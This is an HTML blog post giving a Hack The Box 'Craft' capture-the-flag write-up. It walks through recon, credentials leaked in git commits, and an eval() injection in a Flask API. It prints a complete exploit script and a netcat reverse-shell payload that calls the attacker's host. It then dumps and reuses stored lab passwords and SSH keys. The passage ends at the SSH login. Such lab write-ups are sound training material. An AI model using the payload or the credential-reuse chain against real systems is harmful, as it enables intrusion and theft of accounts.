<!DOCTYPE html>
<html lang="en-us">

  <head>
  <link href="http://gmpg.org/xfn/11" rel="profile" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta http-equiv="content-type" content="text/html; charset=utf-8" />

  <!-- Enable responsiveness on mobile devices-->
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1" />

  <title>
    
      Hack The Box - Craft &middot; Ryan Kozak
    
  </title>

  


  <!-- CSS -->
  <link rel="stylesheet" href="/assets/css/main.css" />
  

<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Abril+Fatface" />

  <!-- Icons -->
  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/favicon.png" />
<link rel="shortcut icon" href="/favicon.ico" />

  <!-- RSS -->
  <link rel="alternate" type="application/rss+xml" title="RSS" href="/feed.xml" />

  <!-- Additional head bits without overriding original head -->

  <!-- Begin Jekyll SEO tag v2.7.1 -->
<title>Hack The Box - Craft | Ryan Kozak</title>
<meta name="generator" content="Jekyll v3.8.7" />
<meta property="og:title" content="Hack The Box - Craft" />
<meta name="author" content="Ryan Kozak" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="hacking, web development, $other" />
<meta property="og:description" content="hacking, web development, $other" />
<link rel="canonical" href="http://0.0.0.0:4000/hack-the-box-craft-writeup/" />
<meta property="og:url" content="http://0.0.0.0:4000/hack-the-box-craft-writeup/" />
<meta property="og:site_name" content="Ryan Kozak" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2020-01-05T00:00:00+00:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Hack The Box - Craft" />
<script type="application/ld+json">
{"@type":"BlogPosting","headline":"Hack The Box - Craft","dateModified":"2020-01-06T03:14:46+00:00","datePublished":"2020-01-05T00:00:00+00:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://0.0.0.0:4000/hack-the-box-craft-writeup/"},"url":"http://0.0.0.0:4000/hack-the-box-craft-writeup/","author":{"@type":"Person","name":"Ryan Kozak"},"description":"hacking, web development, $other","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->


</head>


  <body class="post">

    <div id="sidebar">
  <header>
    <div class="site-title">
      <a href="/">
        
          <span class="back-arrow icon"><svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
  <path d="M0 0h24v24H0z" fill="none"/>
  <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/>
</svg></span>
        
        Ryan Kozak
      </a>
    </div>
    <p class="lead">hacking, web development, $other</p>
  </header>
  <nav id="sidebar-nav-links">

  
    <a class="home-link "
        href="/">Home</a>
  

  

  

  


  
    
  

  
    
    	
      		<a class="page-link " href="/about/">About</a>
    	
    
  

  
    
    	
      		<a class="page-link " href="/contact/">Contact</a>
    	
    
  

  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  

  
    
    	
      		<a class="page-link " href="/books/index.html">Book List</a>
    	
    
  

  
    
    	
    	<!-- TingTingPowPow -->
    	
    
  

  
    
    	
    	<!-- TingTingPowPow -->
    	
    
  

  
    
    	
    	<!-- TingTingPowPow -->
    	
    
  

  
    
    	
    	<!-- TingTingPowPow -->
    	
    
  

  
    
    	
    	<!-- TingTingPowPow -->
    	
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  

  



  


  
    
  

  
    
  

  
    
  

  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  

  

  
  <!-- Optional additional links to insert in sidebar nav -->


</nav>


  <nav id="sidebar-icon-links">
  
    <a id="github-link"
       class="icon" title="Github Profile" aria-label="Github Profile"
       href="https://github.com/d0n601">
      <svg version="1.1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 28"><path d="M12 2c6.625 0 12 5.375 12 12 0 5.297-3.437 9.797-8.203 11.391-0.609 0.109-0.828-0.266-0.828-0.578 0-0.391 0.016-1.687 0.016-3.297 0-1.125-0.375-1.844-0.812-2.219 2.672-0.297 5.484-1.313 5.484-5.922 0-1.313-0.469-2.375-1.234-3.219 0.125-0.313 0.531-1.531-0.125-3.187-1-0.313-3.297 1.234-3.297 1.234-0.953-0.266-1.984-0.406-3-0.406s-2.047 0.141-3 0.406c0 0-2.297-1.547-3.297-1.234-0.656 1.656-0.25 2.875-0.125 3.187-0.766 0.844-1.234 1.906-1.234 3.219 0 4.594 2.797 5.625 5.469 5.922-0.344 0.313-0.656 0.844-0.766 1.609-0.688 0.313-2.438 0.844-3.484-1-0.656-1.141-1.844-1.234-1.844-1.234-1.172-0.016-0.078 0.734-0.078 0.734 0.781 0.359 1.328 1.75 1.328 1.75 0.703 2.141 4.047 1.422 4.047 1.422 0 1 0.016 1.937 0.016 2.234 0 0.313-0.219 0.688-0.828 0.578-4.766-1.594-8.203-6.094-8.203-11.391 0-6.625 5.375-12 12-12zM4.547 19.234c0.031-0.063-0.016-0.141-0.109-0.187-0.094-0.031-0.172-0.016-0.203 0.031-0.031 0.063 0.016 0.141 0.109 0.187 0.078 0.047 0.172 0.031 0.203-0.031zM5.031 19.766c0.063-0.047 0.047-0.156-0.031-0.25-0.078-0.078-0.187-0.109-0.25-0.047-0.063 0.047-0.047 0.156 0.031 0.25 0.078 0.078 0.187 0.109 0.25 0.047zM5.5 20.469c0.078-0.063 0.078-0.187 0-0.297-0.063-0.109-0.187-0.156-0.266-0.094-0.078 0.047-0.078 0.172 0 0.281s0.203 0.156 0.266 0.109zM6.156 21.125c0.063-0.063 0.031-0.203-0.063-0.297-0.109-0.109-0.25-0.125-0.313-0.047-0.078 0.063-0.047 0.203 0.063 0.297 0.109 0.109 0.25 0.125 0.313 0.047zM7.047 21.516c0.031-0.094-0.063-0.203-0.203-0.25-0.125-0.031-0.266 0.016-0.297 0.109s0.063 0.203 0.203 0.234c0.125 0.047 0.266 0 0.297-0.094zM8.031 21.594c0-0.109-0.125-0.187-0.266-0.172-0.141 0-0.25 0.078-0.25 0.172 0 0.109 0.109 0.187 0.266 0.172 0.141 0 0.25-0.078 0.25-0.172zM8.937 21.438c-0.016-0.094-0.141-0.156-0.281-0.141-0.141 0.031-0.234 0.125-0.219 0.234 0.016 0.094 0.141 0.156 0.281 0.125s0.234-0.125 0.219-0.219z"></path>
</svg>

    </a>
  

  
  <a id="stackoverflow-link"
     class="icon" title="Stack Overflow Profile" aria-label="Stack Overflow Profile"
     href="https://stackoverflow.com/users/4681506/ryan-kozak">
    <?xml version="1.0" encoding="utf-8"?>
<svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
	 viewBox="0 0 120 120" style="enable-background:new 0 0 120 120;" xml:space="preserve">
<style type="text/css">
	.st0{fill:#BCBBBB;}
	.st1{fill:#F48023;}
</style>
<polygon class="st0" points="84.4,93.8 84.4,70.6 92.1,70.6 92.1,101.5 22.6,101.5 22.6,70.6 30.3,70.6 30.3,93.8 "/>
<path class="st1" d="M38.8,68.4l37.8,7.9l1.6-7.6l-37.8-7.9L38.8,68.4z M43.8,50.4l35,16.3l3.2-7l-35-16.4L43.8,50.4z M53.5,33.2
	l29.7,24.7l4.9-5.9L58.4,27.3L53.5,33.2z M72.7,14.9l-6.2,4.6l23,31l6.2-4.6L72.7,14.9z M38,86h38.6v-7.7H38V86z"/>
</svg>

  </a>
  

  
  
  
  

  
    <a id="tags-link"
       class="icon"
       title="Tags" aria-label="Tags"
       href="/tags/">
      <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
    <path d="M0 0h24v24H0z" fill="none"/>
    <path d="M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 7v10c0 1.1.9 1.99 2 1.99L16 19c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"/>
</svg>
    </a>
  

  
    <a id="search-link"
       class="icon"
       title="Search" aria-label="Search"
       href="/search/">
      <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
    <path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/>
    <path d="M0 0h24v24H0z" fill="none"/>
</svg>
    </a>
  

  <!-- Optional additional links to insert for icons links -->
</nav>
 
  <p class="copyright">
  &copy; 2021 Ryan Kozak.
</p>

</div>

    <main class="container">
      <header>
  <h1 class="post-title">Hack The Box - Craft</h1>
</header>
<div class="content">
  <div class="post-meta">
  <span class="post-date">05 Jan 2020</span>
  <span class="post-categories">
    
      &bull;

      
      
      

      
        CTF Writeup
      
    
      &bull;

      
      
      

      
        Security
      
    
  </span>
</div>

  <div class="post-body">
    <p><img src="/wp-content/uploads/2019/08/craft/badge.png" alt="Hack The Box Haystack" /></p>

<h1 id="introduction">Introduction</h1>
<p>Today they retired my favorite box so far, Craft. This box was very real world in the chain of mistakes that lead to each exploit. The beer theme and Silicon Valley theme were also awesome. A+ box, and here’s the writeup.</p>

<h1 id="information-gathering">Information Gathering</h1>

<h2 id="port-scan-nmap">Port Scan: Nmap</h2>
<p>We begin our reconnaissance by running a port scan with Nmap, checking default scripts and testing for vulnerabilities.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali:~#</span><span class="w"> </span>nmap <span class="nt">-sVC</span> 10.10.10.110
<span class="go">Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-13 23:23 EDT
Nmap scan report for craft.htb (10.10.10.110)
Host is up (0.40s latency).
Not shown: 998 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.4p1 Debian 10+deb9u5 (protocol 2.0)
| ssh-hostkey:
|   2048 bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 (RSA)
|   256 82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66 (ECDSA)
|_  256 28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33 (ED25519)
443/tcp open  ssl/http nginx 1.15.8
|_http-server-header: nginx/1.15.8
|_http-title: 400 The plain HTTP request was sent to HTTPS port
| ssl-cert: Subject: commonName=craft.htb/organizationName=Craft/stateOrProvinceName=NY/countryName=US
| Not valid before: 2019-02-06T02:25:47
|_Not valid after:  2020-06-20T02:25:47
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
| tls-nextprotoneg:
|_  http/1.1
</span><span class="gp">Service Info: OS: Linux;</span><span class="w"> </span>CPE: cpe:/o:linux:linux_kernel
<span class="go">
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 62.69 seconds

</span></code></pre></div></div>
<p>We see from the output above that ports <strong>22</strong> and <strong>443</strong> are open, meaning we’ve got <code class="highlighter-rouge">ssh</code> and <code class="highlighter-rouge">https</code> to play with. Let’s explore port <strong>443</strong>.</p>

<h3 id="port-443-craft">Port 443: Craft</h3>

<p><img src="/wp-content/uploads/2020/01/craft/craft_homepage.png" alt="Craft Homepage" />
<strong>Figure 1:</strong> Craft’s Homepage</p>

<p>So it looks like there are some links to subdomains. Let’s add these to our <code class="highlighter-rouge">/etc/hosts</code> file so that we can access the other virtual hosts running on the box.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali:~#</span><span class="w"> </span><span class="nb">cat</span> /etc/hosts
<span class="go">127.0.0.1 localhost
127.0.1.1 kali
10.10.10.110    craft.htb
10.10.10.110    api.craft.htb
10.10.10.110    gogs.craft.htb

</span><span class="gp">#</span><span class="w"> </span>The following lines are desirable <span class="k">for </span>IPv6 capable hosts
<span class="go">::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
</span></code></pre></div></div>

<p>Now we can access the two links in the upper right hand corner <code class="highlighter-rouge">https://api.craft.htb/api</code> and <code class="highlighter-rouge">https://gogs.craft.htb</code>.</p>

<p>We see the documentation page for <code class="highlighter-rouge">Craft API 1.0</code>. The page gives us some information about the API’s endpoints and how to interact with them.</p>

<p><img src="/wp-content/uploads/2020/01/craft/craft_api_page.png" alt="Craft API 1.0" />
<strong>Figure 2:</strong> Craft API 1.0</p>

<p>The other link on the page is to <em><a href="https://gogs.io/">Gogs</a></em>, a self hosted git repository. This is fun! It looks like we may get to hack an open source program. Does this remind you of digging through repos on <em><a href="https://github.com">GitHub</a></em>?</p>

<p>Going through the commit history we come across some committed credentials right away. The screenshot actually contains the commit in which they were removed, but we can see through red highlighting!</p>

<p><img src="/wp-content/uploads/2020/01/craft/gogs_credentials.png" alt="API Credentials in Commit" />
<strong>Figure 3:</strong> API Credentials in Commit</p>

<p>It looks like these credentials will also log us into the Gogs account for Dinesh, but there’s nothing much to see inside Dinesh’s account.</p>

<p>By taking a look at the Craft API code we see it’s a <code class="highlighter-rouge">Python / Flask</code> application. Furthermore, it looks like the endpoint <code class="highlighter-rouge">/craft_api/api/brew/endpoints/brew.py</code> calls the <code class="highlighter-rouge">eval()</code> function on user input!. It says that authentication is required, but I think we’ve got that covered already with  <code class="highlighter-rouge">auth=('dinesh', '4aUh0A8PbVJxgd')</code>.</p>

<p><img src="/wp-content/uploads/2020/01/craft/eval_in_brew_endpoint.png" alt="Eval code in brew.py" />
<strong>Figure 4:</strong> Exploitable code in <code class="highlighter-rouge">/craft_api/api/brew/endpoints/brew.py</code>.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="o">@</span><span class="n">auth</span><span class="p">.</span><span class="n">auth_required</span>
    <span class="o">@</span><span class="n">api</span><span class="p">.</span><span class="n">expect</span><span class="p">(</span><span class="n">beer_entry</span><span class="p">)</span>
    <span class="k">def</span> <span class="nf">post</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="s">"""
        Creates a new brew entry.
        """</span>

        <span class="c1"># make sure the ABV value is sane.
</span>        <span class="k">if</span> <span class="nb">eval</span><span class="p">(</span><span class="s">'%s &gt; 1'</span> <span class="o">%</span> <span class="n">request</span><span class="p">.</span><span class="n">json</span><span class="p">[</span><span class="s">'abv'</span><span class="p">]):</span>
            <span class="k">return</span> <span class="s">"ABV must be a decimal value less than 1.0"</span><span class="p">,</span> <span class="mi">400</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">create_brew</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">json</span><span class="p">)</span>
            <span class="k">return</span> <span class="bp">None</span><span class="p">,</span> <span class="mi">201</span>
</code></pre></div></div>

<p>We could use <code class="highlighter-rouge">curl</code> or <code class="highlighter-rouge">postman</code> to send requests to the API, but if we continue to look through the git repo we see in commit <code class="highlighter-rouge">10e3ba4f0a09c778d7cec673f28d410b73455a86</code> that they’ve got a test script already to post new brews.</p>

<p><img src="/wp-content/uploads/2020/01/craft/added_test.png" alt="Added test" />
<strong>Figure 5:</strong> add test script you say!?</p>

<p>Download the test script from here and we’ll use it to send a payload to the app. <code class="highlighter-rouge">https://gogs.craft.htb/Craft/craft-api/src/10e3ba4f0a09c778d7cec673f28d410b73455a86/tests/test.py</code></p>

<h1 id="exploitation">Exploitation</h1>

<h2 id="initial-foothold">Initial Foothold</h2>
<p>So far we’ve found an API, a <code class="highlighter-rouge">git</code> repository containing Python code which seems vulnerable to command injection, as well as a commit containing credentials and a test script.</p>

<p>Developing the exploit isn’t easy. We can test the code locally but we don’t know exactly what’s installed on the machine. This process required developing several payloads that ran correctly locally, only to fail on the box. As it turns out, the box doesn’t have <code class="highlighter-rouge">bash</code> installed on it. Eventually we’re able to gain a reverse shell using netcat with the following payload sent to <code class="highlighter-rouge">avb</code>.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">"""__import__("os").system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.186 4444 &gt;/tmp/f") """</span>
</code></pre></div></div>

<p>Here’s the modified <code class="highlighter-rouge">test.py</code> script with the payload to call our reverse shell.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">json</span>

<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'https://api.craft.htb/api/auth/login'</span><span class="p">,</span>  <span class="n">auth</span><span class="o">=</span><span class="p">(</span><span class="s">'dinesh'</span><span class="p">,</span> <span class="s">'4aUh0A8PbVJxgd'</span><span class="p">),</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
<span class="n">json_response</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
<span class="n">token</span> <span class="o">=</span>  <span class="n">json_response</span><span class="p">[</span><span class="s">'token'</span><span class="p">]</span>

<span class="n">payload</span> <span class="o">=</span> <span class="s">"""__import__("os").system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.186 4444 &gt;/tmp/f") """</span>

<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span> <span class="s">'X-Craft-API-Token'</span><span class="p">:</span> <span class="n">token</span><span class="p">,</span> <span class="s">'Content-Type'</span><span class="p">:</span> <span class="s">'application/json'</span>  <span class="p">}</span>
<span class="c1"># create a sample brew with real shell code... should exploit!
</span><span class="k">print</span><span class="p">(</span><span class="s">"Create exploit brew!"</span><span class="p">)</span>
<span class="n">brew_dict</span> <span class="o">=</span> <span class="p">{}</span>
<span class="n">brew_dict</span><span class="p">[</span><span class="s">'abv'</span><span class="p">]</span> <span class="o">=</span> <span class="n">payload</span>
<span class="n">brew_dict</span><span class="p">[</span><span class="s">'name'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'bullshit199iii1'</span>
<span class="n">brew_dict</span><span class="p">[</span><span class="s">'brewer'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'bullshit1991'</span>
<span class="n">brew_dict</span><span class="p">[</span><span class="s">'style'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'bullshi1991t'</span>

<span class="n">json_data</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">brew_dict</span><span class="p">)</span>
<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="s">'https://api.craft.htb/api/brew/'</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">json_data</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
</code></pre></div></div>

<p>When we run the script with our sexy little payload we catch a reverse shell, and gain our initial foothold.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali:/media/sf_Research#</span><span class="w"> </span>nc <span class="nt">-lvp</span> 4444
<span class="go">listening on [any] 4444 ...
connect to [10.10.14.186] from craft.htb [10.10.10.110] 35703
</span><span class="gp">/bin/sh: can't access tty;</span><span class="w"> </span>job control turned off
<span class="gp">/opt/app #</span><span class="w"> </span><span class="nb">whoami</span>
<span class="go">root
</span><span class="gp">/opt/app #</span><span class="w"> </span><span class="nb">cd</span> /
<span class="gp">/ #</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span>
<span class="go">total 64
drwxr-xr-x    1 root     root          4096 Feb 10  2019 .
drwxr-xr-x    1 root     root          4096 Feb 10  2019 ..
-rwxr-xr-x    1 root     root             0 Feb 10  2019 .dockerenv
</span><span class="c">...
...
...
</span><span class="gp">/ #</span><span class="w">
</span></code></pre></div></div>

<h2 id="user-flag">User Flag</h2>
<p>It looks like we’re in a docker container, so we need to escape that somehow. Under <code class="highlighter-rouge">/opt/app</code> we see a file named <code class="highlighter-rouge">dbtest.py</code>. Here are the contents of that file.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
</span>
<span class="kn">import</span> <span class="nn">pymysql</span>
<span class="kn">from</span> <span class="nn">craft_api</span> <span class="kn">import</span> <span class="n">settings</span>

<span class="c1"># test connection to mysql database
</span>
<span class="n">connection</span> <span class="o">=</span> <span class="n">pymysql</span><span class="p">.</span><span class="n">connect</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="n">settings</span><span class="p">.</span><span class="n">MYSQL_DATABASE_HOST</span><span class="p">,</span>
                             <span class="n">user</span><span class="o">=</span><span class="n">settings</span><span class="p">.</span><span class="n">MYSQL_DATABASE_USER</span><span class="p">,</span>
                             <span class="n">password</span><span class="o">=</span><span class="n">settings</span><span class="p">.</span><span class="n">MYSQL_DATABASE_PASSWORD</span><span class="p">,</span>
                             <span class="n">db</span><span class="o">=</span><span class="n">settings</span><span class="p">.</span><span class="n">MYSQL_DATABASE_DB</span><span class="p">,</span>
                             <span class="n">cursorclass</span><span class="o">=</span><span class="n">pymysql</span><span class="p">.</span><span class="n">cursors</span><span class="p">.</span><span class="n">DictCursor</span><span class="p">)</span>

<span class="k">try</span><span class="p">:</span>
    <span class="k">with</span> <span class="n">connection</span><span class="p">.</span><span class="n">cursor</span><span class="p">()</span> <span class="k">as</span> <span class="n">cursor</span><span class="p">:</span>
        <span class="n">sql</span> <span class="o">=</span> <span class="s">"SELECT `id`, `brewer`, `name`, `abv` FROM `brew` LIMIT 1"</span>
        <span class="n">cursor</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="n">sql</span><span class="p">)</span>
        <span class="n">result</span> <span class="o">=</span> <span class="n">cursor</span><span class="p">.</span><span class="n">fetchone</span><span class="p">()</span>
        <span class="k">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>

<span class="k">finally</span><span class="p">:</span>
    <span class="n">connection</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>

</code></pre></div></div>

<p>If we modify <code class="highlighter-rouge">dbtest.py</code> to execute other commands we can explore the application’s mysql database a bit more.</p>

<p>First, let’s see what tables we have in here. We replace the sql statement above with one to show us the tables, and replace the <code class="highlighter-rouge">fetchone()</code> command with <code class="highlighter-rouge">fetchall()</code>.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">with</span> <span class="n">connection</span><span class="p">.</span><span class="n">cursor</span><span class="p">()</span> <span class="k">as</span> <span class="n">cursor</span><span class="p">:</span>
        <span class="n">sql</span> <span class="o">=</span> <span class="s">"SHOW TABLES"</span>
        <span class="n">cursor</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="n">sql</span><span class="p">)</span>
        <span class="n">result</span> <span class="o">=</span> <span class="n">cursor</span><span class="p">.</span><span class="n">fetchall</span><span class="p">()</span>
        <span class="k">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>

<span class="k">finally</span><span class="p">:</span>
    <span class="n">connection</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
</code></pre></div></div>

<p>Here’s what we get for tables in the craft database.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">/opt/app #</span><span class="w"> </span>python hh.py
<span class="go">[{'Tables_in_craft': 'brew'}, {'Tables_in_craft': 'user'}]
</span></code></pre></div></div>

<p>Oh look a <code class="highlighter-rouge">user</code> table, let’s dump that out and see what we get! Again we replace the sql command, this time to display the entire <code class="highlighter-rouge">user</code> table.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">with</span> <span class="n">connection</span><span class="p">.</span><span class="n">cursor</span><span class="p">()</span> <span class="k">as</span> <span class="n">cursor</span><span class="p">:</span>
        <span class="n">sql</span> <span class="o">=</span> <span class="s">"SELECT * FROM `user`"</span>
        <span class="n">cursor</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="n">sql</span><span class="p">)</span>
        <span class="n">result</span> <span class="o">=</span> <span class="n">cursor</span><span class="p">.</span><span class="n">fetchall</span><span class="p">()</span>
        <span class="k">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>

<span class="k">finally</span><span class="p">:</span>
    <span class="n">connection</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
</code></pre></div></div>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">/opt/app #</span><span class="w"> </span>python hh.py
<span class="go">[{'id': 1, 'username': 'dinesh', 'password': '4aUh0A8PbVJxgd'}, {'id': 4, 'username': 'ebachman', 'password': 'llJ77D8QFkLPQB'}, {'id': 5, 'username': 'gilfoyle', 'password': 'ZEU3N8WNM2rh4T'}]
</span></code></pre></div></div>

<p>Oh my, they’re storing passwords in plain text! There must be some credential stuffing we can do with all these.</p>

<p>We already had the credentials for dinesh, but now we’ve got the credentials for everyone. It doesn’t look like we can ssh in with any of these creds, but let’s go back to Gogs and start trying them there. We already know that dinesh reused his password, so maybe the others did too.</p>

<p>It looks like we can login as gilfoyle, and it seems he’s got a private repository in his account.</p>

<p><img src="/wp-content/uploads/2020/01/craft/private_repo.png" alt="private repository" />
<strong>Figure 5:</strong> craft_infra private repo.</p>

<p>When we explore the private <code class="highlighter-rouge">craft_infra</code> repository, we see that this crazy dude committed his private and public keys.</p>

<p><img src="/wp-content/uploads/2020/01/craft/id_rsa_pub.png" alt="ssh keys" />
<strong>Figure 6:</strong> ssh keys inside.</p>

<p>Another really interesting bit of information in this private repo is in <code class="highlighter-rouge">craft_infra/vault/secrets.sh</code>.</p>

<p><img src="/wp-content/uploads/2020/01/craft/vault_secrets_sh.png" alt="vault secrets" />
<strong>Figure 7:</strong> vault secrets!</p>

<p>It appears as though he’s running <code class="highlighter-rouge">vault</code> as root. Once we get access to the user flag, we’ll probably be using this for our privilege escalation to root.</p>

<p>First, let’s add the keys we’ve found to our own <code class="highlighter-rouge">~/.ssh/</code> directory in kali and see if we can get the user flag finally.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali:~/.ssh#</span><span class="w"> </span>ssh-add
<span class="go">Enter passphrase for /root/.ssh/id_rsa:
Identity added: /root/.ssh/id_rsa (gilfoyle@craft.htb)
</span><span class="gp">root@kali:~/.ssh#</span><span class="w"> </span>ssh gilfoyle@craft.htb
<span class="go">

  .   *   ..  . *  *
*  * @()Ooc()*   o  .
    (Q@*0CG*O()  ___
   |\_________/|/ _ \
   |  |  |  |  | / | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | \_| |
   |  |  |  |  |\___/
   |\_|__|__|_/|
    \_________/



